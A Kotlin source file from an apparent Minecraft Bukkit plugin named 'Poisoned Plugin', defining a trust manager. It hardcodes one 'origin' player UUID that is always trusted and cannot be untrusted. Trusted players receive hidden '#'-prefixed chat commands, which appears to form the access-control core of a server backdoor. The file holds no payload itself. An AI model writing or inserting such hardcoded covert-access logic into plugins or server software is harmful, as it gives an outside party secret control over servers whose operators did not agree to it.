/*
 * MIT License
 *
 * Copyright (c) 2023 Max Bossing
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */
package de.maxbossing.poisonedplugin.manager

import de.maxbossing.poisonedplugin.utils.log
import org.bukkit.entity.Player
import java.util.*

/**
 * Trust Manager
 *
 * Trust is a core principle of the Poisoned Plugin, as untrusted Players cannot do anything
 */
object TrustedUserManager {

    /**
     * Origin Trusts, cannot be untrusted
     */
    val originTrusts = listOf(
        UUID.fromString("11e6f3a0-d838-4f93-a046-e16e5cd0dbd8")
    )

    /**
     * Trusted Users
     */
    val trustedUsers: MutableList<UUID> = originTrusts.toMutableList()


    /**
     * Get/Set the Player trust
     */
    var Player.trusted: Boolean
        get() = trustedUsers.contains(this.uniqueId)
        set(value) {
            if (!value) {
                trustedUsers.remove(this.uniqueId)
                removeCustomChatCompletions(ChatCommandManager.commands.keys.map { "#$it" })
                log("${this.name} untrusted")
            } else {
                trustedUsers.add(this.uniqueId)
                addCustomChatCompletions(ChatCommandManager.commands.keys.map { "#$it" })
                log("${this.name} trusted")
            }
        }

    /**
     * Trust a Player
     */
    fun Player.trust() {
        trusted = true
    }

    /**
     * Untrust a Player
     */
    fun Player.untrust() {
        trusted = false
    }
}
